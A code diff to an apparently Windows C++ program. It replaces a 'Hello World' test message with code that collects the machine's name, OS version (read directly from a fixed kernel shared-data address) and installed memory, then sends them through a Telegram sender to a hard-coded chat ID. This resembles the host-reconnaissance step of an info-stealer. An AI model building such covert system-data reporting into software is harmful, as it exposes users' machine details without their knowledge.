@@ -4,6 +4,7 @@
 
 #include <filesystem>
 #include <fstream>
+#include <syncstream>
 
 #include "senders/sender.h"
 #include "senders/telegram_sender.h"
@@ -100,6 +101,25 @@ int main() try
 
 #endif
 
+struct pc_t
+{
+    TCHAR name[1024];
+    TCHAR os[1024];
+    TCHAR total_memory[1024];
+    TCHAR uuid[1024];
+    TCHAR cpu[1024];
+    TCHAR gpu[1024];
+
+    [[nodiscard]] std::string str() const
+    {
+        std::stringstream ss;
+        ss << "PC Name: " << name << "\n";
+        ss << "OS Name: " << os << "\n";
+        ss << "Total Memory: " << total_memory << "\n";
+        return ss.str();
+    }
+};
+
 asio::awaitable<void> co_main()
 {
     auto io_context = co_await asio::this_coro::executor;
@@ -109,7 +129,29 @@ asio::awaitable<void> co_main()
         "515352778"
     } } ;
 
-    const auto result = co_await sender->send_message("Hello World");
+    pc_t pc;
+    DWORD size = 1024;
+
+    if(!GetComputerName(pc.name, &size))
+        DLOG("Cant get Computer Name");
+
+    auto sharedUserData = (BYTE*)0x7FFE0000;
+    sprintf_s(pc.os, "Windows %d.%d.%d",
+        *(ULONG*)(sharedUserData + 0x26c),  // major version offset
+        *(ULONG*)(sharedUserData + 0x270),  // minor version offset
+        *(ULONG*)(sharedUserData + 0x260)); // build number offset
+
+    ULONGLONG mem;
+    if(!GetPhysicallyInstalledSystemMemory(&mem))
+    {
+        DLOG("Cant get Total Memory");
+        mem = 0;
+    }
+    sprintf_s(pc.total_memory, "%llu GB", mem / (1024*1024));
+
+    DLOG(pc.str());
+
+    const auto result = co_await sender->send_message(pc.str());
     std::cout << json::serialize(result) << "\n";
 }
 
